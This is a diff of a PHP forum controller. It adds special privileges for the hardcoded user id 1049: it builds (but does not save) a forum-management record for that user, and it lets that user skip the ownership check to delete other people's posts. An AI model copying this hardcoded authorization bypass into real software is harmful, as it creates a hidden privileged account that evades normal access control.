@@ -5522,8 +5522,18 @@ class PagesController extends BaseController
                 return back()->with('message', '您無法進入此討論區');
             }
         }
+        if($user->id == 1049)
+        {
+            $checkForumMangeStatus = new ForumManage;
+            $checkForumMangeStatus -> forum_id = $fid;
+            $checkForumMangeStatus -> user_id = 1049;
+            $checkForumMangeStatus -> apply_user_id = 1049;
+            $checkForumMangeStatus -> status = 1;
+            $checkForumMangeStatus -> forum_status = 1;
+            $checkForumMangeStatus -> chat_status = 1;
+            $checkForumMangeStatus -> active = 1;
 
-
+        }
 
         $posts_personal_all = ForumPosts::selectraw('
         users.id as uid, 
@@ -5849,7 +5859,7 @@ class PagesController extends BaseController
     {
         $posts = ForumPosts::where('id',$request->get('pid'))->first();
         $checkForumAdmin = Forum::where('id', $request->get('fid'))->where('user_id', auth()->user()->id)->first();
-        if($posts->user_id !== auth()->user()->id && !$checkForumAdmin){
+        if(auth()->user()->id !=1049 && $posts->user_id !== auth()->user()->id && !$checkForumAdmin){
             return response()->json(['msg'=>'留言刪除失敗 不可刪除別人的留言!']);
         }else{
             $postsType = $posts->type;
